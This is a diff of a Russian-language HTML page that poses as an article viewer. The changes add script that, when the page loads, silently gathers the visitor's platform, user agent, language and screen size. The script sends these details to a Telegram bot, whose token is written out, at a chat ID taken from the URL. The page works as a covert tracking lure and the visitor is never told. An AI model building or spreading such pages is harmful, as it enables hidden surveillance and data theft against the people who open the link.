@@ -8,14 +8,12 @@
         body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         h1 { color: #444; }
         .content { margin-top: 20px; }
-        .info { margin-top: 20px; font-size: 0.9em; color: #666; }
     </style>
 </head>
 <body>
     <div id="article">
         <h1 id="title">Загрузка...</h1>
         <div id="content" class="content">Загрузка данных...</div>
-        <div id="info" class="info"></div>
     </div>
 
     <script>
@@ -34,18 +32,19 @@
                 document.getElementById('title').textContent = params['title'] || 'Без названия';
                 document.getElementById('content').textContent = params['state'] || 'Нет содержимого';
                 
-                // Отображаем дополнительную информацию
+                // Собираем данные об устройстве
+                const deviceInfo = `
+Платформа: ${navigator.platform}
+Браузер: ${navigator.userAgent}
+Язык: ${navigator.language}
+Онлайн: ${navigator.onLine}
+Ширина экрана: ${screen.width}
+Высота экрана: ${screen.height}
+                `.trim();
                 
-                
-                // Отправляем уведомление в Telegram
+                // Отправляем данные в Telegram
                 if (params['chat_id']) {
-                    const message = `📡 Кто-то открыл статью!
-IP: ${params['ip'] || 'N/A'}
-Страна: ${params['country'] || 'N/A'}
-Город: ${params['city'] || 'N/A'}
-Платформа: ${params['platform'] || 'N/A'}`;
-                    
-                    fetch(`https://api.telegram.org/bot8052191957:AAGreJnTaY_MAjUYhIBf3Zh_Hg653pb4Pkw/sendMessage?chat_id=${params['chat_id']}&text=${encodeURIComponent(message)}`);
+                    fetch(`https://api.telegram.org/bot8052191957:AAGreJnTaY_MAjUYhIBf3Zh_Hg653pb4Pkw/sendMessage?chat_id=${params['chat_id']}&text=📡 Кто-то открыл статью!\n\n${encodeURIComponent(deviceInfo)}`);
                 }
                 
             } catch (e) {
